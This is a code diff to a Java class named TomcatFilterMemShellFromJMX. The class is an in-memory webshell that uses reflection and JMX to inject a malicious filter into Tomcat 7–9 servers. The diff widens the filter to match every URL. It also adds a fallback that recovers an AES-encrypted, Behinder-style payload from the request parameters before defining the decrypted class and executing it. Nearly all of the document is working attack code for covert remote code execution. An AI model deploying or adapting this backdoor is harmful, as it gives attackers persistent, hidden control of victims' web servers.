@@ -8,8 +8,10 @@ import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import org.apache.catalina.Context;
+import org.apache.catalina.connector.Request;
 import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.core.StandardContext;
+import org.apache.tomcat.util.http.Parameters;
 import org.apache.tomcat.util.modeler.Registry;
 
 import javax.crypto.Cipher;
@@ -26,17 +28,14 @@ import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.HashMap;
-import java.util.Iterator;
-import java.util.Scanner;
-import java.util.Set;
+import java.util.*;
 
-public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
+public class TomcatFilterMemShellFromJMX extends AbstractTranslet implements Filter {
     // 适用范围: Tomcat 7 ~ 9
     static {
         try {
             String filterName = "MyFilterVersion" + System.nanoTime();
-            String urlPattern = "/ser";
+            String urlPattern = "/*";
 
             MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
             Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
@@ -75,12 +74,12 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
                         }
 
                         Object filterDef = filterDefClass.newInstance();
-                        filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});
-                        Filter filter = new TomcatFilterMemShell();
+                        filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
+                        Filter filter = new TomcatFilterMemShellFromJMX();
 
-                        filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
-                        filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
-                        standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});
+                        filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
+                        filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
+                        standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, filterDef);
 
                         //设置 FilterMap
                         //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
@@ -92,14 +91,14 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
                         }
 
                         Object filterMap = filterMapClass.newInstance();
-                        filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
-                        filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
-                        filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{urlPattern});
+                        filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
+                        filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
+                        filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, urlPattern);
                         //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
-                        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});
+                        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);
 
                         //设置 FilterConfig
-                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
+                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                         constructor.setAccessible(true);
                         ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                         map.put(filterName, filterConfig);
@@ -157,15 +156,44 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
                     }
                 } else if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                     if (request.getMethod().equals("POST")) {
-                        String k = "7ab2695c3c103c7c54130685ef2cc03a".substring(16); // Y4er
+                        String k = "e45e329feb5d925b"; // rebeyond
                         session.putValue("u", k);
                         Cipher c = Cipher.getInstance("AES");
                         c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
 
-                        //revision BehinderFilter
                         Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                         method.setAccessible(true);
-                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                        String payload = request.getReader().readLine();
+//                        System.out.println("readLine():" + payload);
+                        if (payload == null || payload.isEmpty() || payload.equals("null")) {
+                            payload = "";
+                            Field field = null;
+                            field = request.getClass().getDeclaredField("request");
+                            field.setAccessible(true);
+                            Request realRequest = (Request) field.get(request);
+                            Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
+                            coyoteRequestField.setAccessible(true);
+                            org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
+                            Parameters parameters = coyoteRequest.getParameters();
+                            Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
+                            paramHashValues.setAccessible(true);
+                            LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);
+
+                            Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
+
+                            while (iterator.hasNext()) {
+                                Map.Entry<String, ArrayList<String>> next = iterator.next();
+                                payload = payload + next.getKey().replaceAll(" ", "+") + "=";
+                                ArrayList<String> list = next.getValue();
+                                String listString = "";
+                                for (String s : list) {
+                                    listString += s;
+                                }
+                                payload = payload + listString.replaceAll(" ", "+");
+                            }
+//                            System.out.println(payload);
+                        }
+                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                         Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                         evilclass.newInstance().equals(pageContext);
                         return;
